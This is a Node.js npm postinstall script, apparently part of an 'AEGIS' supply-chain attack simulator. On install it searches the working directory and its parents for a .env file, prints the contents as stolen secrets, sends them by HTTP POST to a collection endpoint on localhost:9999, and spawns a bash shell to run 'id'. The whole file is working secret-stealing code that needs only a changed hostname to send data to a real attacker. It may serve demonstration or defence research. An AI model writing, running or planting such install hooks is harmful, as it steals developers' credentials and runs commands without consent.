const fs = require('fs');
const path = require('path');
const http = require('http');
const { spawn } = require('child_process');

console.log('[AEGIS-SIMULATOR] postinstall script running...');

// Step 1: Find and read .env in process.cwd(), __dirname, or parent directories
let envContent = null;
let envPath = null;

const searchStartingPoints = [process.cwd(), __dirname];

for (const startPoint of searchStartingPoints) {
  let currentDir = startPoint;
  for (let i = 0; i < 5; i++) {
    const targetPath = path.join(currentDir, '.env');
    if (fs.existsSync(targetPath)) {
      envPath = targetPath;
      try {
        envContent = fs.readFileSync(targetPath, 'utf8');
      } catch (err) {
        // ignore read error
      }
      break;
    }
    const parent = path.dirname(currentDir);
    if (parent === currentDir) break;
    currentDir = parent;
  }
  if (envContent) break;
}

if (envContent) {
  console.log(`[EXFIL] Found target secrets at ${envPath}:`);
  console.log('--- STOLEN ENV START ---');
  console.log(envContent.trim());
  console.log('--- STOLEN ENV END ---');
} else {
  console.log('[EXFIL] Warning: .env file not found in parent directories.');
  envContent = 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
}

// Step 2: Exfiltrate payload via HTTP POST to localhost:9999/exfil
console.log('[POST] Attempting exfiltration to http://localhost:9999/exfil...');
const postData = JSON.stringify({
  stolen_from: envPath || 'unknown',
  env: envContent,
  timestamp: new Date().toISOString()
});

const req = http.request(
  {
    hostname: 'localhost',
    port: 9999,
    path: '/exfil',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  },
  (res) => {
    console.log(`[POST] Exfiltration server responded with status: ${res.statusCode}`);
  }
);

req.on('error', (err) => {
  console.log(`[POST] Exfiltration request notice: ${err.message} (Is listener.py running?)`);
});

req.write(postData);
req.end();

// Step 3: Attempt to spawn child bash process (`bash -c "id"`)
console.log('[SHELL] Attempting command execution: bash -c "id"');
try {
  const child = spawn('bash', ['-c', 'id']);

  child.stdout.on('data', (data) => {
    console.log(`[SHELL] Output: ${data.toString().trim()}`);
  });

  child.stderr.on('data', (data) => {
    console.log(`[SHELL] Error: ${data.toString().trim()}`);
  });

  child.on('error', (err) => {
    console.log(`[SHELL] Spawn note: ${err.message}`);
  });
} catch (err) {
  console.log(`[SHELL] Spawn exception: ${err.message}`);
}
